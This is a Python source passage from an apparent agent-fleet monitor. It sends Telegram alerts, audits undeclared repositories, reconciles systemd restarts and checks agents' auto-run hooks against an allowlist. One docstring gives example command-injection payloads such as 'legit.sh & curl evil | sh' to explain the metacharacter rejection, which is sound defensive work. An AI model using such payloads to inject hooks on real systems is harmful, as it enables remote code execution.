    PANTHEON_DISABLE_LIVE_TELEGRAM overrides either way ('1'/'true'/'yes'
    force-suppress; '0'/'false'/'no' force-send for tests exercising the body).
    """
    override = os.environ.get("PANTHEON_DISABLE_LIVE_TELEGRAM", "").strip().lower()
    if override in ("1", "true", "yes"):
        return True
    if override in ("0", "false", "no"):
        return False
    return (
        "unittest" in sys.modules
        or "pytest" in sys.modules
        or bool(os.environ.get("PYTEST_CURRENT_TEST"))
    )


def send_telegram(text: str) -> bool:
    """POST to the Telegram Bot API (chat=Recovery's surface). Returns True on 2xx.

    Cron context has no MCP reply tool, so monitors alert via the Bot API
    directly — same pattern as usage_monitor.send_telegram / inbox_consumer.
    """
    if _live_telegram_suppressed():
        print("context_fill_monitor: test context — live telegram suppressed", file=sys.stderr)
        return False
    token = read_telegram_token()
    if not token:
        print("context_fill_monitor: no telegram token; alert NOT sent", file=sys.stderr)
        return False
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    body = json.dumps({"chat_id": OPERATOR_CHAT_ID, "text": text}).encode("utf-8")
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return 200 <= resp.status < 300
    except (urllib.error.URLError, OSError) as exc:
        print(f"context_fill_monitor: telegram send failed: {exc}", file=sys.stderr)
        return False


def _missing_dir_marker_path(agent: str) -> Path:
    """T-0824 part 2: per-agent marker that a missing-jsonl_dir alert already fired."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_missing_dir_{agent}.json"


def maybe_alert_missing_projects_dir(agent: str, projects_dir: Path, *, reason: str | None = None) -> None:
    """T-0824 part 2: Telegram-alert ONCE per misconfig episode that agent's
    jsonl_dir does not exist. A marker file dedups so an unattended monitor does
    not ping every poll (~5 min); cleared by clear_missing_projects_dir_marker
    once the dir reappears, so a genuine recurrence re-alerts. This is the
    runtime backstop to the proactive `--validate` bringup gate.

    `reason` (T-2071) overrides the default 'jsonl_dir absent' message so the same
    once-per-episode throttle can carry a different misconfig (e.g. the account
    itself does not exist) — the alert episode is per-agent regardless of cause."""
    marker = _missing_dir_marker_path(agent)
    if marker.exists():
        return  # already alerted this episode; stay quiet until it self-heals
    msg = reason or (
        f"⚠️ [context-fill-monitor] {agent}: jsonl_dir does not exist "
        f"({projects_dir}). The monitor cannot detect context fill for {agent} "
        f"and will never fire a restart — likely a recovery-layer misconfig. "
        f"Run `context_fill_monitor.py --validate` to check all agent configs."
    )
    send_telegram(msg)
    try:
        marker.parent.mkdir(parents=True, exist_ok=True)
        marker.write_text(
            json.dumps(
                {"agent": agent, "projects_dir": str(projects_dir), "ts": int(time.time())}
            )
            + "\n",
            encoding="utf-8",
        )
    except OSError as exc:
        _log(agent, f"maybe_alert_missing_projects_dir: marker write failed {exc!r}")


def clear_missing_projects_dir_marker(agent: str) -> None:
    """T-0824 part 2: clear the missing-dir alert marker once the dir is present
    again (or the probe is inconclusive) — so a later genuine disappearance re-alerts."""
    marker = _missing_dir_marker_path(agent)
    try:
        marker.unlink(missing_ok=True)
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Undeclared-repo audit (T-0761 component 5)
# ---------------------------------------------------------------------------


def _repo_audit_marker_path(agent: str) -> Path:
    """Per-agent marker file for the undeclared-repo audit (T-0761 component 5).

    Records the sorted list of undeclared repo names seen at last alert, so the
    tripwire fires ONCE per distinct violation-state rather than every poll.
    """
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"repo_audit_undeclared_{agent}.json"


def _scan_agent_repos(agent: str, cfg: dict) -> list[str] | None:
    """Return sorted list of git-repo directory basenames present in agent's home.

    Uses a sudo'd ``find`` (-maxdepth 2 -mindepth 2 -type d -name .git, i.e. it
    matches ``<home>/<repo>/.git`` and prints the depth-1 ``<repo>`` dir) so the
    scan works cross-account.  -type d intentionally targets real clones whose
    ``.git`` is a
    directory, NOT git worktrees (whose ``.git`` is a file) or /tmp worktrees
    (outside home).  Returns None on subprocess failure — fail-open (caller treats
    None as «can't determine» and skips the alert).
    """
    agent_home = str(Path(cfg["handoff_file"]).parent)
    # `find <home> -maxdepth 2 -mindepth 2 -type d -name .git -printf '%h\n'`
    # -maxdepth 2 / -mindepth 2 targets exactly <home>/<repo>/.git — depth-1 repos.
    # -printf '%h\n' prints the parent dir of each .git found.
    inner = (
        f"find {agent_home} -maxdepth 2 -mindepth 2 -type d -name .git -printf '%h\\n'"
    )
    cmd = _sudo_prefix(cfg["sudo_user"]) + ["bash", "-c", inner]
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=JSONL_PROBE_TIMEOUT_SECONDS,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        _log(agent, f"repo-audit: scan failed: {exc!r}")
        return None
    if proc.returncode != 0:
        _log(agent, f"repo-audit: scan exited {proc.returncode}: {proc.stderr[:200]!r}")
        return None
    names = sorted(
        Path(line).name
        for line in proc.stdout.splitlines()
        if line.strip()
    )
    return names


def _always_ok_repo_names(registry: dict) -> set[str]:
    """Return set of repo names that are always-declared without a ticket.

    Includes repos in ``always_available`` (e.g. pantheon-config) and repos in
    ``ignored`` (e.g. excalidraw-diagram-skill, toys).  Both classes are
    permanently exempt from the undeclared-repo alert.
    """
    ok: set[str] = set()
    for entry in registry.get("always_available") or []:
        if isinstance(entry, dict) and entry.get("repo"):
            ok.add(entry["repo"])
    for entry in registry.get("ignored") or []:
        if isinstance(entry, dict) and entry.get("repo"):
            ok.add(entry["repo"])
    return ok


def _active_ticket_repos(repo_root: Path) -> set[str]:
    """Return set of repo names declared in any active ticket's ``repos:`` field.

    Reads ``<repo_root>/tickets/active/*.md``, parses frontmatter, and collects
    the name portion of each ``repos:`` list entry (strip the ``:access`` suffix).
    Fails open: skips unparseable tickets; returns empty set if the directory is
    absent.
    """
    active_dir = repo_root / "tickets" / "active"
    if not active_dir.is_dir():
        return set()
    # Import parse_front_matter lazily so tests that don't need ticket-parsing
    # don't drag in the module.  Fail-open if unavailable.
    try:
        from tools.ticket import TicketError, parse_front_matter  # noqa: PLC0415
    except ImportError:
        return set()
    repos: set[str] = set()
    for md in active_dir.glob("*.md"):
        try:
            text = md.read_text(encoding="utf-8")
            fields, _ = parse_front_matter(text)
        except Exception:  # TicketError, OSError, or anything else → skip
            continue
        repos_field = fields.get("repos")
        if not isinstance(repos_field, list):
            continue
        for item in repos_field:
            name, _sep, _access = str(item).partition(":")
            name = name.strip()
            if name:
                repos.add(name)
    return repos


def _undeclared_repos(
    present: list[str], always_ok: set[str], ticket_repos: set[str]
) -> list[str]:
    """Return sorted list of present repos not in always_ok or ticket_repos."""
    ok = always_ok | ticket_repos
    return sorted(r for r in present if r not in ok)


def maybe_alert_undeclared_repos(agent: str, cfg: dict, repo_root: Path) -> None:
    """T-0761 component 5: alert-once tripwire for repos present on agent's disk
    that are NOT declared in any active ticket's ``repos:`` field AND NOT in
    always_available or ignored entries of repos.yaml.

    Alert fires when the undeclared set changes; stays quiet when unchanged;
    marker is cleared when the set is empty (clean state).  Routed via the
    existing ``send_telegram`` helper (same alert channel as hook-deviation and
    missing-dir alerts).  Fail-open: any load failure (registry unavailable,
    scan fails) skips the alert silently.

    Gated on PANTHEON_REPO_AUDIT_ENABLED (default OFF, REPO_AUDIT_DEFAULT_ENABLED).
    Per the T-0867 ship-dark playbook: armed per-agent via a systemd drop-in once
    the T-0761 enforcement regime is active (tickets carry repos: fields).
    """
    # Ship-dark gate (T-0761 component 5): disarmed until enforcement regime live.
    _enabled_default = "1" if REPO_AUDIT_DEFAULT_ENABLED else "0"
    if os.environ.get("PANTHEON_REPO_AUDIT_ENABLED", _enabled_default) != "1":
        return

    # Load registry — fail-open if unavailable (T-1136: delegates to shared loader).
    from tools.repo_registry import load_repo_registry  # noqa: PLC0415

    registry = load_repo_registry(repo_root)
    if registry is None:
        _log(agent, "repo-audit: repos.yaml registry absent or unparseable; skipping audit")
        return

    always_ok = _always_ok_repo_names(registry)
    ticket_repos = _active_ticket_repos(repo_root)

    present = _scan_agent_repos(agent, cfg)
    if present is None:
        return  # scan failed — fail-open

    undeclared = _undeclared_repos(present, always_ok, ticket_repos)
    marker = _repo_audit_marker_path(agent)

    if not undeclared:
        _clear_repo_audit_marker(agent)
        return

    # Check whether the set has changed since the last alert.
    prior_data = _read_state_file(marker)
    prior_repos: list[str] = prior_data.get("repos", []) if prior_data else []
    if undeclared == prior_repos:
        return  # same set — dedup, stay quiet

    # New or changed violation set — alert + write marker.
    msg = (
        f"⚠️ [repo-audit] {agent}: {len(undeclared)} repo(s) present on disk but "
        f"NOT declared in any active ticket's repos: field — "
        f"{', '.join(undeclared)}. "
        f"Declare via a ticket repos: field or add to repos.yaml ignored: list."
    )
    send_telegram(msg)
    try:
        marker.parent.mkdir(parents=True, exist_ok=True)
        marker.write_text(
            json.dumps({"agent": agent, "repos": undeclared, "ts": int(time.time())})
            + "\n",
            encoding="utf-8",
        )
    except OSError as exc:
        _log(agent, f"repo-audit: marker write failed: {exc!r}")


def _clear_repo_audit_marker(agent: str) -> None:
    """Clear the undeclared-repo audit marker (set is now empty / resolved)."""
    marker = _repo_audit_marker_path(agent)
    try:
        marker.unlink(missing_ok=True)
    except OSError:
        pass


# ---------------------------------------------------------------------------
def _restart_failure_state_path_for_agent(agent: str) -> Path:
    """Per-T-0584 Layer 3: consecutive-restart-failure counter state file."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"restart_failure_count_{agent}.json"


def bump_restart_failure_count(agent: str, last_error_tail: str) -> int:
    """Increment the consecutive-failure counter for agent. Returns new count.

    Per T-0584 Layer 3: each fire_restart non-success bumps the counter; a
    success calls reset_restart_failure_count() to clear it. When the counter
    reaches RESTART_FAILURE_ALERT_THRESHOLD, the caller surfaces a loud
    Telegram alert (the original 2026-05-25 incident silently re-fired
    "lock held by another instance" every 5 min for 3.5 days).
    """
    path = _restart_failure_state_path_for_agent(agent)
    path.parent.mkdir(parents=True, exist_ok=True)
    prior = _read_state_file(path) or {}
    try:
        prior_count = int(prior.get("count", 0))
    except (TypeError, ValueError):
        prior_count = 0
    count = prior_count + 1
    payload = {
        "agent": agent,
        "count": count,
        "ts": int(time.time()),
        "last_error_tail": last_error_tail,
    }
    path.write_text(json.dumps(payload) + "\n", encoding="utf-8")
    return count


def reset_restart_failure_count(agent: str) -> None:
    """Clear the consecutive-failure counter on a successful restart."""
    path = _restart_failure_state_path_for_agent(agent)
    if path.exists():
        try:
            path.unlink()
        except OSError:
            pass


# --- T-2459: detached-dispatch cross-cycle effectiveness reconciliation ---
# The blocking fire_restart used to return (success == handoff_and_restart.sh
# exit code) synchronously, feeding reset_restart_failure_count (success) /
# bump_restart_failure_count + threshold alert (failure) — the T-0584 net that
# caught the 2026-05-25 3.5-day silent re-fire. Detached dispatch only knows the
# restart was DISPATCHED, so a script-level failure (lock held / ack timeout)
# would dispatch-OK and silently never bump the count, blinding that net. We
# recover the true outcome ONE CYCLE LATER from the transient unit itself.

def _pending_dispatch_path_for_agent(agent: str) -> Path:
    """State file recording the in-flight detached-restart transient unit so the
    next poll can read its exit status (T-2459)."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"restart_pending_dispatch_{agent}.json"


def record_pending_dispatch(agent: str, unit: str, reason: str) -> None:
    """Mark a dispatched detached restart for cross-cycle reconciliation (T-2459)."""
    path = _pending_dispatch_path_for_agent(agent)
    path.parent.mkdir(parents=True, exist_ok=True)
    payload = {"agent": agent, "unit": unit, "reason": reason, "ts": int(time.time())}
    path.write_text(json.dumps(payload) + "\n", encoding="utf-8")


def _clear_pending_dispatch(agent: str) -> None:
    path = _pending_dispatch_path_for_agent(agent)
    if path.exists():
        try:
            path.unlink()
        except OSError:
            pass


def _show_transient_unit(unit: str) -> dict:
    """`systemctl --user show` a recovery-owned transient restart unit. Returns the
    queried properties as a dict; {} on any failure (fail-open) — the caller
    treats {} as 'unqueryable this cycle' and leaves the marker pending (T-2459)."""
    try:
        r = subprocess.run(
            ["systemctl", "--user", "show", unit,
             "-p", "LoadState", "-p", "ActiveState", "-p", "Result", "-p", "ExecMainStatus"],
            capture_output=True, text=True, timeout=15,
        )
    except (subprocess.TimeoutExpired, OSError):
        return {}
    out: dict[str, str] = {}
    for line in r.stdout.splitlines():
        key, sep, val = line.partition("=")
        if sep:
            out[key] = val
    return out


def reconcile_prior_dispatch(agent: str) -> None:
    """Read a prior detached restart's transient unit and feed the T-0584 net (T-2459).

    context-fill dispatches WITHOUT --collect, so systemd auto-collects a
    SUCCESSFUL unit (LoadState=not-found next cycle) while a FAILED one LINGERS:
      unqueryable ({} from show)              → fail-open: leave pending, judge later
      LoadState=not-found                     → succeeded + auto-collected → reset
      ActiveState activating/active/…         → still running → leave pending (no double-count)
      failed (ActiveState=failed / Result!=success / ExecMainStatus!=0) → bump + maybe-alert, reset-failed
      inactive + Result=success               → succeeded, not yet collected → reset
    """
    path = _pending_dispatch_path_for_agent(agent)
    pending = _read_state_file(path)
    if not pending:
        return
    unit = pending.get("unit")
    if not unit:
        _clear_pending_dispatch(agent)
        return
    st = _show_transient_unit(unit)
    if not st:
        # Unqueryable this cycle (slow/absent bus). Fail-open: judge next cycle.
        return
    load = st.get("LoadState")
    active = st.get("ActiveState")
    result = st.get("Result")
    try:
        exec_status: int | None = int(st.get("ExecMainStatus", ""))
    except (TypeError, ValueError):
        exec_status = None

    if load == "not-found":
        _log(agent, f"detached restart unit {unit} auto-collected (success); clearing failure count")
        reset_restart_failure_count(agent)
        _clear_pending_dispatch(agent)
        return
    if active in ("activating", "active", "deactivating", "reloading"):
        _log(agent, f"detached restart unit {unit} still running ({active}); judging effectiveness next cycle")
        return
    failed = (
        active == "failed"
        or (result is not None and result != "success")
        or (exec_status is not None and exec_status != 0)
    )
    if failed:
        tail = (f"detached restart unit {unit} FAILED "
                f"(ActiveState={active} Result={result} ExecMainStatus={exec_status})")
        _log(agent, tail)
        count = bump_restart_failure_count(agent, tail)
        if count >= RESTART_FAILURE_ALERT_THRESHOLD:
            maybe_alert_restart_failure_threshold(agent, count, tail)
        # Clean the lingering failed unit so it neither re-counts nor noises --failed.
        try:
            subprocess.run(["systemctl", "--user", "reset-failed", unit],
                           capture_output=True, text=True, timeout=15)
        except (subprocess.TimeoutExpired, OSError):
            pass
        _clear_pending_dispatch(agent)
        return
    _log(agent, f"detached restart unit {unit} completed cleanly (Result={result}); clearing failure count")
    reset_restart_failure_count(agent)
    _clear_pending_dispatch(agent)


def dispatch_detached_restart(
    cfg: dict, agent: str, *, reason: str, skip_ack: bool = False
) -> tuple[bool, str, str | None]:
    """T-2459: replace the blocking fire_restart in the three non-tombstone
    monitor branches. Dispatches handoff_and_restart.sh as a DETACHED transient
    unit (no --collect, so a failure lingers for reconcile_prior_dispatch) and
    records the pending marker. A 15-min oneshot can no longer SIGKILL — and
    orphan, cross-UID — an in-flight restart. Returns (dispatched_ok, output, unit)."""
    ok, output, unit = fire_restart_detached(
        cfg, agent, unit_prefix=CTXFILL_REMEDIATE_UNIT_PREFIX, skip_ack=skip_ack, collect=False
    )
    if ok and unit:
        record_pending_dispatch(agent, unit, reason)
    return ok, output, unit


def maybe_alert_restart_failure_threshold(agent: str, count: int, last_error_tail: str) -> bool:
    """Surface a Telegram alert when consecutive failures hit the threshold.

    Re-alerts on every additional failure past the threshold (the failure is
    actively wedged; we WANT periodic reminders). Returns True on send success.
    """
    if count < RESTART_FAILURE_ALERT_THRESHOLD:
        return False
    text = (
        f"[context_fill_monitor] {agent} auto-restart wedged: "
        f"{count} consecutive failures.\n"
        f"Last error tail: {last_error_tail[:300]}"
    )
    # T-0722: route per the operator's directive — other agents' failures go via Recovery
    # (triage); Recovery's own go direct to the operator (it can't self-remediate). Falls
    # back to a direct send if the router import is unavailable (a wedge alert
    # must still get out).
    try:
        try:
            from tools.inbox_consumer import route_failure_alert  # run-as-package / tests
        except ImportError:
            from inbox_consumer import route_failure_alert  # run-as-script (prod)
        route_failure_alert(agent, text, vocab=f"restart-failure ({agent})")
        return True
    except Exception as exc:
        _log(agent, f"restart-failure alert: routing unavailable ({exc!r}); direct-telegram fallback")
        return send_telegram(f"[fallback: routing unavailable] {text}")


def notify_restart_success(agent: str, fill_pct: float, threshold: float, mode: str) -> None:
    """Surface a SUCCESS-path notification when an auto-restart fires cleanly.

    Per T-0708: clean context-fill auto-restarts were silent by design — both
    main() success paths (direct fire_restart and the Recovery tombstone-write) only
    _log + record state, so a healthy restart was invisible to the operator and Recovery
    (the ONLY pre-existing Telegram path, maybe_alert_restart_failure_threshold,
    fires solely after >=3 consecutive FAILURES). The operator's directive: pipe these
    to Recovery properly. We route via inbox_consumer._send_alert_via_recovery (the same
    consolidated operational-alert router maybe_alert_hook_deviation uses) so the
    event lands in Recovery's pane + audit-pings the operator; defensive direct-telegram
    fallback if that router is unavailable, mirroring the hook-deviation path.

    mode: 'restarted' (direct fire completed) or 'tombstone' (drain will fire it).
    """
    if mode == "tombstone":
        detail = "restart tombstone written; drain timer fires within ~30s"
    elif mode == "dispatched":
        detail = "auto-restart dispatched as a detached transient unit (async, T-2459)"
    else:
        detail = "auto-restart fired cleanly"
    msg = (
        f"♻️ [context-fill] {agent} {detail} "
        f"(fill {fill_pct:.0%} ≥ threshold {threshold:.0%}). Clean restart — no action needed."
    )
    try:
        try:
            from tools.inbox_consumer import _send_alert_via_recovery  # run-as-package / tests
        except ImportError:
            from inbox_consumer import _send_alert_via_recovery  # run-as-script (prod)
        _send_alert_via_recovery(msg, "context-fill-restart")
    except Exception as exc:
        _log(agent, f"restart-success notify: recovery-routing unavailable ({exc!r}); direct-telegram fallback")
        send_telegram(f"[fallback: recovery-routing unavailable] {msg}")


def _hook_alert_state_path_for_agent(agent: str) -> Path:
    """Throttle-state file for the hook-deviation alert (per agent)."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"hook_alert_{agent}.json"


def _hook_alert_throttled(agent: str) -> bool:
    """True if a hook-deviation alert fired within the throttle window."""
    data = _read_state_file(_hook_alert_state_path_for_agent(agent))
    if not data:
        return False
    last = _parse_iso8601_to_epoch(data.get("last_alert_at"))
    if last is None:
        return False
    return (time.time() - last) < HOOK_ALERT_THROTTLE_SECONDS


def _record_hook_alert(agent: str, deviations: list) -> None:
    path = _hook_alert_state_path_for_agent(agent)
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(
            json.dumps(
                {
                    "agent": agent,
                    "last_alert_at": datetime.now().astimezone().isoformat(),
                    "deviations": deviations,
                }
            ),
            encoding="utf-8",
        )
    except OSError as exc:
        _log(agent, f"hook-alert: could not write throttle state: {exc!r}")


def _settings_path_for_agent(cfg: dict) -> Path:
    """`<agent-home>/.claude/settings.json`, derived from the account (sudo_user).

    T-1945: was derived from handoff_file, which observation-only entries
    (seats) don't carry — KeyError killed their hook check. sudo_user is
    present on every entry and its home IS the handoff_file parent for all
    prior entries, so this is behavior-identical where both exist.
    """
    return Path("/home") / cfg["sudo_user"] / ".claude" / "settings.json"


def _extract_hook_commands(settings: dict) -> list[str]:
    """All hook command strings across ALL hook events in a settings dict.

    settings["hooks"] = {event: [ {matcher?, hooks:[{type, command}]} ]}.
    """
    commands: list[str] = []
    hooks = settings.get("hooks")
    if not isinstance(hooks, dict):
        return commands
    for _event, matchers in hooks.items():
        if not isinstance(matchers, list):
            continue
        for matcher in matchers:
            if not isinstance(matcher, dict):
                continue
            for entry in matcher.get("hooks", []) or []:
                if isinstance(entry, dict) and entry.get("command"):
                    commands.append(str(entry["command"]))
    return commands


def _script_basenames(command: str) -> set[str]:
    """Basenames of the script-like tokens a hook command invokes.

    A token is 'script-like' if it contains a path separator or ends in a known
    script extension. Raises ValueError on unparseable quoting (caller treats an
    unparseable hook command as a deviation — never best-effort downgrades it).
    """
    tokens = shlex.split(command)  # ValueError on unbalanced quotes → caller flags
    names: set[str] = set()
    for tok in tokens:
        base = os.path.basename(tok)
        if ("/" in tok) or base.endswith(_HOOK_SCRIPT_EXTS):
            if base:
                names.add(base)
    return names


def _command_is_allowlisted(command: str, allow: set[str]) -> bool:
    """True iff `command` is a clean invocation of exactly ONE allowlisted script.

    Conservative by design (this is a security check, so it must fail CLOSED to
    deviation, never open to 'clean'):
    - ANY shell metacharacter (``; | & ` $ > < ( ) { } \\`` or newline) ⇒ False.
      Legit hook commands are simple `[interp] /path/script.<ext> [plainargs]`;
      metacharacters mean we can't reason about what runs, and they're how an
      attacker appends a payload to an allowlisted token (e.g.
      `handoff-auto-read.sh $(curl evil)`, `echo x > handoff-auto-read.sh`,
      `legit.sh & curl evil | sh`).
    - Unparseable quoting ⇒ False.
    - Exactly one script-like token, and its basename is in `allow` ⇒ True.
      Zero script tokens (inline command) or 2+ (multiple scripts) ⇒ False.
    """
    if any(ch in command for ch in _HOOK_SHELL_METACHARS):
        return False
    try:
        names = _script_basenames(command)
    except ValueError:
        return False
    return len(names) == 1 and names <= allow


def check_hook_allowlist(agent: str, cfg: dict) -> list[str]:
    """Return a list of human-readable deviations for the agent's auto-run hooks.

    A hook command is OK iff `_command_is_allowlisted` accepts it: no shell
    metacharacters, parseable, and exactly one allowlisted script basename.
    Anything else is a deviation. Errs toward alerting (security check). Fail-OPEN
    on READ errors only (sudo/parse failure → [] — a transient read glitch must
    not masquerade as a deviation OR get swallowed as 'clean').
    """
    allow = HOOK_ALLOWLIST.get(agent)
    if allow is None:
        # Config drift: an agent in AGENT_CONFIG but not HOOK_ALLOWLIST would get
        # ZERO hook checking silently. Log loudly rather than no-op quietly.
        _log(agent, f"hook-check: NO allowlist entry for agent '{agent}' — check SKIPPED (config drift)")
        return []
    settings_path = _settings_path_for_agent(cfg)
    cmd = _sudo_prefix(cfg["sudo_user"]) + [
        "bash",
        "-c",
        f"cat {shlex.quote(str(settings_path))} 2>/dev/null",
    ]
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, check=False, timeout=JSONL_PROBE_TIMEOUT_SECONDS
        )
    except (subprocess.TimeoutExpired, OSError) as exc:
        _log(agent, f"hook-check: read error {exc!r}; fail-open")
        return []
    if result.returncode != 0 or not result.stdout.strip():
        _log(agent, f"hook-check: settings unreadable (rc={result.returncode}); fail-open")
        return []
    try:
        settings = json.loads(result.stdout)
    except json.JSONDecodeError as exc:
        _log(agent, f"hook-check: settings.json parse error {exc}; fail-open")
        return []

    deviations: list[str] = []
    for command in _extract_hook_commands(settings):
        if not _command_is_allowlisted(command, allow):
            deviations.append(command)
    return deviations


def check_allowlist_staleness(agent: str, cfg: dict) -> list[str]:
    """Return allowlisted basenames NOT wired in the agent's settings.json.

    T-1965 (Metis): basename-only matching makes a STALE allowlist entry
    strictly worse than in a path-matched design — a retired-but-not-pruned
    name pre-blesses that basename wired later from ANY path, silently, on
    the exact surface whose job is catching injected hooks. This guard turns
    the allowlist from names-once-blessed into names-currently-in-use.

    MUST share `_script_basenames` with `_command_is_allowlisted` — a naive
    tokenizer differs on quoted paths (found live at build time: orchestrator's
    hook-handler.js is wired via a QUOTED path; whitespace-split reads the
    closing quote into the basename and manufactures false staleness).

    Fail-OPEN to [] on read/parse errors (same posture as the deviation
    check); commands _script_basenames can't parse don't count as referencing
    (they're deviations — the deviation alert owns them).
    """
    allow = HOOK_ALLOWLIST.get(agent)
    if not allow:
        return []
    settings_path = _settings_path_for_agent(cfg)
    cmd = _sudo_prefix(cfg["sudo_user"]) + [
        "bash",
        "-c",
        f"cat {shlex.quote(str(settings_path))} 2>/dev/null",
    ]
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, check=False, timeout=JSONL_PROBE_TIMEOUT_SECONDS
        )
    except (subprocess.TimeoutExpired, OSError):
        return []
    if result.returncode != 0 or not result.stdout.strip():
        return []
    try:
        settings = json.loads(result.stdout)
    except json.JSONDecodeError:
        return []
    referenced: set[str] = set()
    for command in _extract_hook_commands(settings):
        try:
            referenced |= _script_basenames(command)
        except ValueError:
            continue
    return sorted(set(allow) - referenced)


# Staleness is hygiene, not compromise — long throttle so it surfaces weekly
# until pruned, without becoming cycle noise.
HOOK_STALE_ALERT_THROTTLE_SECONDS = 7 * 24 * 60 * 60


def _hook_stale_state_path_for_agent(agent: str) -> Path:
    """Throttle-state file for the staleness alert (per agent, same convention
    as _hook_alert_state_path_for_agent)."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"hook_stale_alert_{agent}.json"


def maybe_alert_allowlist_staleness(agent: str, cfg: dict) -> None:
    """Run the staleness guard; WARN-log + weekly-throttled alert on findings."""
    try:
        stale = check_allowlist_staleness(agent, cfg)
    except Exception as exc:  # never wedge the monitor
        _log(agent, f"hook-stale: unexpected error {exc!r}; skipping")
        return
    if not stale:
        return
    _log(agent, f"hook-stale: {len(stale)} allowlisted-but-unwired entr(y/ies): {stale}")
    path = _hook_stale_state_path_for_agent(agent)
    now = time.time()
    try:
        last = json.loads(path.read_text()).get("last_alert_at", 0)
    except (OSError, ValueError):
        last = 0
    if now - last < HOOK_STALE_ALERT_THROTTLE_SECONDS:
        return
    msg = (
        f"🧹 [hook-allowlist-stale] {agent}: allowlisted hook name(s) not wired in "
        f"{_settings_path_for_agent(cfg)}: {stale}. A stale entry pre-blesses that "
        f"basename from ANY path (T-1965) — verify retirement, then prune it from "
        f"HOOK_ALLOWLIST in tools/context_fill_monitor.py (or re-wire the hook). "
        f"Hygiene, not an active compromise."
    )
    try:
        try:
            from tools.inbox_consumer import _send_alert_via_recovery
        except ImportError:
            from inbox_consumer import _send_alert_via_recovery
        _send_alert_via_recovery(msg, "hook-allowlist-stale")
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps({"last_alert_at": now, "stale": stale}))
    except Exception as exc:
        _log(agent, f"hook-stale: alert routing failed ({exc!r}); WARN log only this cycle")


def maybe_alert_hook_deviation(agent: str, cfg: dict) -> None:
    """Run the hook-allowlist check; alert Recovery (throttled) on any deviation.

    Best-effort + side-effect-only — never raises into the main control loop.
    """
    enabled = os.environ.get(HOOK_CHECK_ENABLED_ENV, "1").strip().lower()
    if enabled in ("0", "false", "no", "off"):
        return
    try:
        deviations = check_hook_allowlist(agent, cfg)
    except Exception as exc:  # defensive: a security check must not wedge the monitor
        _log(agent, f"hook-check: unexpected error {exc!r}; skipping")
        return
    if not deviations:
        return
    _log(agent, f"hook-check: {len(deviations)} DEVIATION(S) detected: {deviations}")
    if _hook_alert_throttled(agent):
        _log(agent, "hook-check: alert throttled (already fired within window)")
        return
    settings_path = _settings_path_for_agent(cfg)
    lines = "\n".join(f"  • {d}" for d in deviations)
    msg = (
        f"🚨 [hook-allowlist] UNRECOGNIZED auto-run hook(s) on {agent} "
        f"({settings_path}) — possible Mini Shai-Hulud-style injection (T-0536). "
        f"Investigate; do NOT auto-remediate a suspected compromise; escalate to "
        f"the operator with findings:\n{lines}\n"
        f"Allowlisted for {agent}: {sorted(HOOK_ALLOWLIST.get(agent, set()))}."
    )
    # Route to RECOVERY's pane (Recovery investigates + escalates) via the consolidated
    # operational-alert router (T-0314/T-0364) — internal alerts must NOT relay
    # straight through the operator (it audit-pings the operator + falls back to direct
    # operator-telegram if Recovery's pane is unreachable). Defensive fallback to a
    # direct send if that router is somehow unavailable — a security alert must
    # still get out.
    delivered = False
    try:
        try:
            from tools.inbox_consumer import _send_alert_via_recovery  # run-as-package / tests
        except ImportError:
            from inbox_consumer import _send_alert_via_recovery  # run-as-script (prod)

        _send_alert_via_recovery(msg, "hook-allowlist")
        delivered = True
    except Exception as exc:
        _log(agent, f"hook-check: recovery-routing unavailable ({exc!r}); direct-telegram fallback")
        delivered = send_telegram(f"[fallback: recovery-routing unavailable] {msg}")
    if delivered:
        _record_hook_alert(agent, deviations)


def _pane_confirmed_wedged(agent: str) -> bool:
    """Read-only pane check via verify_startup.sh. True ONLY when it affirmatively
    reports the pane WEDGED (exit 7 / "pane":"wedged").

    Every other outcome — idle/healthy (0), uncheckable, capture failure, missing
    script, timeout, parse error — returns False. This is the HEALTHY-IDLE GUARD:
    a destructive restart must never fire on an ambiguous read (a genuinely-idle
    healthy agent also has frozen fill; only a confirmed-wedged pane distinguishes
    it). --no-dewedge: the monitor only OBSERVES; the recovery path owns keystrokes.
    The monitor runs on Recovery's account; verify_startup sudo's internally for
    cross-account capture, so one script path serves all agents.
    """
    if not os.path.exists(VERIFY_STARTUP_BIN):
        return False
    try:
        res = subprocess.run(
            ["bash", VERIFY_STARTUP_BIN, "--agent", agent, "--no-dewedge", "--json"],
            capture_output=True,
            text=True,
            timeout=VERIFY_STARTUP_TIMEOUT_SECONDS,
        )
    except (subprocess.TimeoutExpired, OSError):
        return False
    if res.returncode == 7:
        return True
    # Defensive secondary parse (rc may be remapped by a wrapper): trust an
    # explicit "pane":"wedged" only.
    try:
        data = json.loads(res.stdout.strip().splitlines()[-1]) if res.stdout.strip() else {}
        return data.get("pane") == "wedged"
    except (json.JSONDecodeError, IndexError, ValueError):
        return False


# Subagent-block guard (T-1776; redesigned per adversarial review): a session
# BLOCKED on a long-running subagent has a frozen MAIN jsonl (the subagent's
# transcript is outside the monitored projects dir) and a non-idle pane --
